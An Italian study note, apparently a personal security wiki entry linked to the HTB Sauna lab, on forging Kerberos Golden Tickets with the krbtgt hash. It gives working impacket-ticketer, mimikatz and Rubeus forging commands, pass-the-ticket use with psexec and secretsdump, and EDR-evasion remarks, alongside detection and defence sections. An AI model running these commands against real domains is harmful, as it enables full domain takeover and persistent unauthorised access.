---

tags:

- golden-ticket
- kerberos
- active-directory
- persistence
- credential-forgery
- post-exploit
- hacking-exposed-7 aliases:
- Golden Ticket
- TGT forgery
- krbtgt abuse

---

# Golden Ticket — Forgia un TGT Kerberos e Diventa Dio del Dominio

## 1. Il concetto in una frase

> Con l'hash NT (o la chiave AES) dell'account **`krbtgt`**, puoi **forgiare manualmente un Ticket-Granting Ticket (TGT)** che il KDC accetterà come legittimo, conferendoti accesso come **qualsiasi utente con qualsiasi privilegio** per fino a 10 anni.

Non è un exploit — è la **conseguenza logica** del design Kerberos. Se possiedi la chiave con cui i TGT vengono firmati, sei effettivamente il KDC.

> [!abstract] Pre-requisito assoluto Per fare un Golden Ticket ti serve l'**NT hash di `krbtgt`**. L'unico modo realistico di ottenerlo è via [[dcsync]] (o accesso fisico al DC + dump NTDS.dit). Su [[htb_sauna]] hai fatto DCSync e ottenuto questo hash — Golden Ticket sarebbe stato il next step se avessi voluto persistenza.

---

## 2. Ripasso Kerberos — perché funziona

Per capire perché Golden Ticket esiste, serve avere chiaro il flusso Kerberos normale:

```
┌─────────┐                                         ┌────────────┐
│ Client  │                                         │   KDC      │
│ (user)  │                                         │  (=DC)     │
└────┬────┘                                         └─────┬──────┘
     │                                                     │
     │── AS-REQ (chi sono, pre-auth con password) ────────→│
     │                                                     │
     │←──── AS-REP: TGT cifrato con krbtgt key ─────────────│
     │       + session key                                  │
     │                                                     │
     │── TGS-REQ (presento TGT, voglio servizio X) ───────→│
     │   KDC decifra TGT con krbtgt key, valida           │
     │                                                     │
     │←──── TGS-REP: ticket per servizio X ─────────────────│
     │                                                     │
     │── Service Request (presento ticket) ───────────────→│ servizio
     │                                                     │
```

### Cosa contiene un TGT

|Campo|Valore|
|---|---|
|Username|`mario`|
|Domain|`corp.local`|
|SID utente|`S-1-5-21-...-1105`|
|**PAC** (Privilege Attribute Certificate)|Lista gruppi + privilegi|
|Validità|tipicamente 10 ore, rinnovabile fino a 7 giorni|
|Session key|per cifrare richieste successive|
|**Firma/cifratura**|**con NT hash di krbtgt**|

### Il punto debole filosofico

Il KDC, quando riceve un TGT in una TGS-REQ:

1. Decifra il TGT con la sua copia della chiave krbtgt
2. Se decifra correttamente → **si fida del contenuto**
3. Estrae username, gruppi, privilegi dal PAC
4. Emette un TGS basato su quei claim

**Il KDC non ri-valida i claim** contro AD. Se il TGT dice "io sono Domain Admin", il KDC ti tratta come Domain Admin. La firma di krbtgt è la sola garanzia.

> [!warning] La conseguenza Se possiedi la chiave krbtgt, puoi **firmare TGT che dicono quello che vuoi tu**: utente inesistente, gruppi inventati, validità di 10 anni, qualsiasi cosa. Il KDC li accetterà perché la firma è valida.

---

## 3. Cosa permette concretamente un Golden Ticket

### Claim arbitrari nel PAC

Puoi forgiare un TGT con:

- **Username inesistente** ("pippo123") — il KDC non controlla che esista
- **SID arbitrario** — incluso S-1-5-21-...-500 (Administrator built-in)
- **Gruppi inventati** — Domain Admins, Enterprise Admins, Schema Admins, Built-in Administrators
- **Validità decennale** — invece dei normali 10h + 7d rinnovo

### Accesso garantito

Con quel TGT puoi:

- Richiedere TGS per **qualsiasi servizio** del dominio
- Accedere a **qualsiasi macchina** che si fida del DC
- Eseguire DCSync nuovamente quando vuoi (chiusura del cerchio)
- Fare lateral movement ovunque senza necessità di ulteriori credenziali

> [!tip] Persistenza assoluta Anche se l'admin si accorge della compromissione, **cambiare la password di tutti gli utenti non ti caccia**. Il tuo Golden Ticket è firmato con krbtgt, non con la password di nessun utente. Devono ruotare **krbtgt due volte** (con delay per replica) per invalidarti. La maggior parte delle aziende non lo fa mai.

---

## 4. Forgiare un Golden Ticket — i tool

### Cosa serve

|Dato|Da dove|
|---|---|
|**NT hash di krbtgt**|DCSync ([[dcsync]])|
|**Domain SID**|`whoami /user` mostra `S-1-5-21-X-Y-Z-RID`, prendi `S-1-5-21-X-Y-Z`|
|**Nome dominio**|`corp.local`|
|(Opzionale) Username target|Qualsiasi stringa, anche inesistente|

### Con impacket-ticketer (Linux/Kali)

```bash
impacket-ticketer \
    -nthash <KRBTGT_NTHASH> \
    -domain-sid <DOMAIN_SID> \
    -domain corp.local \
    <fake_username>

# Esempio Sauna:
impacket-ticketer \
    -nthash <krbtgt_hash_da_dcsync> \
    -domain-sid S-1-5-21-2386624377-410428362-1067743225 \
    -domain EGOTISTICAL-BANK.LOCAL \
    fakeadmin

# Output: fakeadmin.ccache
```

Per usare il ticket:

```bash
export KRB5CCNAME=fakeadmin.ccache
impacket-psexec corp.local/fakeadmin@dc01 -k -no-pass
# -k = use Kerberos
# -no-pass = non chiedere password, usa il ticket
```

### Con mimikatz (Windows)

```
mimikatz # kerberos::golden 
    /domain:corp.local 
    /sid:S-1-5-21-...
    /krbtgt:<KRBTGT_NTHASH>
    /user:fakeadmin
    /id:500
    /groups:512,513,518,519,520
    /ptt
```

Parametri chiave:

- `/id:500` → RID di Administrator built-in
- `/groups:` → SIDs di Domain Admins (512), Domain Users (513), Schema Admins (518), Enterprise Admins (519), Group Policy Creator Owners (520)
- `/ptt` → "Pass-the-Ticket" — inietta il ticket nella sessione corrente

### Con Rubeus (Windows, moderno)

```powershell
Rubeus.exe golden /user:fakeadmin /domain:corp.local /sid:S-1-5-21-... /krbtgt:<HASH> /nowrap
Rubeus.exe ptt /ticket:<base64_ticket>
```

Rubeus è più moderno e più stealth di mimikatz (binary non flaggato da EDR come "mimikatz").

---

## 5. Uso del ticket — pattern tipico

```bash
# 1. Forgia il ticket
impacket-ticketer -nthash KRBTGT -domain-sid SID -domain corp.local fakeadmin

# 2. Esporta per uso
export KRB5CCNAME=fakeadmin.ccache

# 3. Verifica che funzioni con un comando innocuo
impacket-getuserspns corp.local/fakeadmin -k -no-pass

# 4. Usa per accesso reale
impacket-psexec corp.local/fakeadmin@10.0.0.5 -k -no-pass
impacket-secretsdump corp.local/fakeadmin@10.0.0.5 -k -no-pass

# 5. evil-winrm con Kerberos
evil-winrm -i dc01.corp.local -r corp.local
# (con KRB5CCNAME settato nell'env)
```

> [!note] Importante: usa il FQDN Quando usi un ticket Kerberos, devi specificare il target come **FQDN** (es. `dc01.corp.local`), non come IP. Kerberos non funziona con IP — il ticket è emesso per uno SPN che contiene il nome host.

---

## 6. Golden Ticket vs Silver Ticket

Esiste una variante più sottile e meno potente: **Silver Ticket**.

|Aspetto|Golden Ticket|Silver Ticket|
|---|---|---|
|**Chiave usata**|NT hash di **krbtgt**|NT hash di un **service account**|
|**Cosa forgia**|TGT (poi richiede TGS)|TGS direttamente (skippa il KDC)|
|**Scope**|Tutto il dominio|Solo il servizio specifico (es. SQL server X)|
|**Traffico KDC**|Sì (richiede TGS)|**No** — skippa completamente il KDC|
|**Stealth**|Media (Event 4769)|Altissima (no traffico KDC)|
|**Persistence**|Decennale, fino a krbtgt rotation 2x|Fino a quando service account cambia password|

```
Golden Ticket workflow:
    Client (TGT forgiato) → KDC (richiede TGS) → KDC emette TGS legittimo → servizio

Silver Ticket workflow:
    Client (TGS forgiato) → servizio direttamente
    (il KDC non vede nulla!)
```

Silver Ticket è **meno potente** ma **molto più stealth**. Spesso usato in operazioni red team avanzate quando il monitoring è aggressivo.

---

## 7. Detection — è davvero invisibile?

### Storicamente: difficile da rilevare

Il TGT forgiato decifra correttamente, quindi il KDC lo accetta come legittimo. Nessun errore, nessun fail.

### Modernamente: pattern detection possibile

|Indicatore|Cosa cercare|
|---|---|
|**Lifetime anomalo**|TGT con validità >10 ore o renew time >7 giorni = sospetto (default Kerberos)|
|**Account inesistenti**|TGS-REQ con username che non esiste in AD = forgia evidente|
|**Event ID 4769** (TGS Request)|Su DC, per ogni richiesta TGS|
|**Event ID 4624** in pattern strani|Logon Type 3 da host con TGT lifetime anomalo|
|**PAC validation failure**|Su servizi con PAC validation enforced (raro abilitato)|
|**Sequence numbers inconsistenti**|I forgiati hanno spesso sequence anomali rispetto a krbtgt reale|

### Tool di detection

- **PingCastle** — audit AD con check su krbtgt age
- **BloodHound** non lo rileva direttamente (è post-fatto, non un permesso)
- **SIEM rules custom** su 4769 + lifetime anomalies
- **Microsoft ATA / Defender for Identity** — analytics specifico per Kerberos anomalies

> [!warning] Realtà operativa Anche con tutti questi controlli, Golden Ticket forgiati **con attenzione** (lifetime standard 10h, account che esistono davvero, RID realistici) sono **estremamente difficili** da rilevare. La detection migliore è prevenire l'ottenimento di krbtgt hash in primo luogo.

---

## 8. Difese

### Primaria: proteggere krbtgt

Il krbtgt hash è la **chiave del regno**. Proteggerlo è la priorità assoluta.

|Difesa|Come funziona|
|---|---|
|**Krbtgt rotation periodica**|Cambiare la password di krbtgt ogni 6-12 mesi (script Microsoft ufficiale)|
|**Double rotation dopo compromise**|Due rotation con delay per la replica → invalida Golden Ticket esistenti|
|**Tier 0 isolation**|DC non interagiscono con altri tier → no LSASS dump propagabile|
|**PAW** per Domain Admins|Admin operano solo da workstation dedicate → no foothold abuse|
|**Disable replication for non-DCs**|Audit ACL su dominio → revocare DCSync rights a service account|

### Secondaria: ridurre l'efficacia

|Difesa|Come funziona|
|---|---|
|**PAC validation** ([[ms-kerb-protocol-extensions]])|Servizi che validano il PAC contro AD live (raro abilitato)|
|**Authentication Policy Silos**|Limitare a quali host un account può autenticarsi via Kerberos|
|**Smart card per privileged accounts**|Account che non possono autenticarsi solo via password/hash|
|**Kerberos armoring (FAST)**|Channel binding che rende il TGT non riutilizzabile fuori contesto|

### Krbtgt rotation procedure

```powershell
# Script ufficiale Microsoft "New-KrbtgtKeys.ps1"
# Esegue rotation del krbtgt password (in realtà cambia la chiave, non la password)
# Da eseguire DUE VOLTE con delay >= max ticket lifetime (10h default)
```

---

## 9. La storia del Golden Ticket

Il concetto è stato presentato pubblicamente da **Benjamin Delpy** (autore di mimikatz) nel 2014. Da allora è diventato lo strumento standard di persistenza in AD per:

- **APT groups** (Cozy Bear, Fancy Bear, ecc.) per persistenza decennale
- **Ransomware operators** per garantirsi accesso anche dopo IR
- **Red teams** per simulare adversari sofisticati

> [!note] Perché è ancora un problema nel 2026 Il design Kerberos non può essere "patchato" senza una revisione fondamentale del protocollo. Microsoft ha aggiunto mitigazioni (PAC validation, FAST, ecc.) ma il vettore di base **rimane intrinseco** al modello. Finché esiste krbtgt, esiste Golden Ticket.

---

## 10. Il workflow completo — da zero a Golden Ticket

```
Foothold iniziale (phishing, exploit, ecc.)
    ↓
Local privilege escalation ([[privilege_escalation_windows]])
    ↓
Credential dumping → cerco account con DCSync rights
    ↓
Se trovato (Sauna pattern) → DCSync ([[dcsync]])
    ↓
Hash NT di krbtgt
    ↓
GOLDEN TICKET forgiato
    ↓
Persistenza decennale + accesso illimitato
```

Su Sauna ti sei fermato a "Pass-the-Hash con Administrator" perché era il game over per la box. In un engagement reale, dopo DCSync il next step sarebbe stato **forgiare un Golden Ticket** come misura di persistenza.

---

## Takeaways

1. **Golden Ticket = TGT forgiato** con la chiave di krbtgt
2. Il KDC **si fida del PAC** dentro il TGT, non lo valida → claim arbitrari accettati
3. **Prerequisito assoluto**: hash NT di krbtgt, ottenibile via [[dcsync]]
4. **Persistenza decennale** — invalidabile solo con rotation x2 di krbtgt
5. **Silver Ticket** è una variante più stealth ma meno potente (per-service)
6. Tool: **impacket-ticketer**, **mimikatz**, **Rubeus**
7. **Detection difficile** — il ticket è crittograficamente valido, non c'è "errore"
8. **Difesa primaria**: proteggere krbtgt (rotation periodica, ridurre chi ha DCSync, tier separation)
9. **Concetto chiave per esame**: con krbtgt hash sei effettivamente il KDC → diventi un'autorità di emissione di credenziali

---

## Wiki-links

- [[dcsync]]
- [[HTB - Sauna]]]
- [[Active Directory (AD)]]
- [[GetNPUsers - AS-REP Roasting]]
- [[kerberoasting]]
- [[Pass-the-Hash]]
- [[Lateral Movement]]
- [[Privilege Escalation Windows]]
- [[Silver Ticket]]
- [[impacket]]
- [[mimikatz]]
- [[Rubeus]]
- [[mitre_attck]]
- [[hacking_exposed_7_windows]]